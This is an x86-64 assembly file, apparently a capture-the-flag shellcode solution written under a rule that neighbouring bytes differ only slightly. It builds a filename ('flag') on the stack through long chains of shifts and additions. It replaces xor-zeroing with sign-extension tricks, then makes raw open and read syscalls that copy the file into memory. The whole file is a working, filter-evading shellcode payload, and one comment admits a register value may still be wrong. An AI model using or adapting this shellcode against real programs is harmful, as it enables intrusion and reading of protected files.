# additional constraint: difference between two bytes shall be small
.text
.global main
main:
	push %rbp
	# "flag"
	#mov %rsp, %rbp
	push %rsp
	pop %rbp
	
	push %rdx 
	push $60 # just to lower the rsp
	
	# "flagger\0"
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	addb $70, %al
	addb $33, %al
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	addb $70, %al
	addb $27, %al
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	addb $70, %al
	addb $38, %al
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	addb $70, %al
	addb $32, %al
	
	push %rax

	
	# load rsp to rdi (filename char*)
	push %rsp
	pop %rdi
	
	
#	add $12, %rsp
	push %rsp
	pop %rax
	
	addb $12, %al
	push %rax
	pop %rsp

	#subb $12, %al
	
#	xor %rax, %rax
	

	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	addb $0, %al
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	addb $70, %al
	addb $44, %al
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	addb $70, %al
	addb $31, %al
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	shl %eax
	addb $70, %al
	addb $33, %al
	push %rax
	
	# open
	#movq	%rsp, %rdi # file
	# xor %esi, %esi # flags
	and $0, %al
	cbw
	cwde
	cdqe
	xchg %eax, %esi
	
	# xor	%edx, %edx # mode
	and $0, %al
	cbw
	cwde
	cdqe
	xchg %eax, %edx
	
	# xor %eax, %eax
	and $0, %al
	cbw
	cwde
	cdqe

	addb $2, %al # sys_open
	syscall

	# mov fd to next param
	xchg	%eax, %edi # fd

	# read
		# revert rsp
		push %rsp
		pop %rax
		addb $12, %al
		push %rax
		pop %rsp
		
	#call 5
	#pop %rsi # buf = begin of code
	#sub $40, %rsi
	#mov %rcx, %rsi
	pop %rsi  # buf = begin of code

	#movl	$40, %edx # len
	push $40
	pop %rdx

	# xor %eax, %eax
	and $0, %al
	cbw
	cwde
	cdqe # sys_read
	syscall

	#mov %rbp, %rsp
	push %rbp
	pop %rsp
	
	pop %rbp # das ist aber noch falscher wert?!
	# nop ret ret just for aligning the two bytes
	nop
	ret # 
	ret
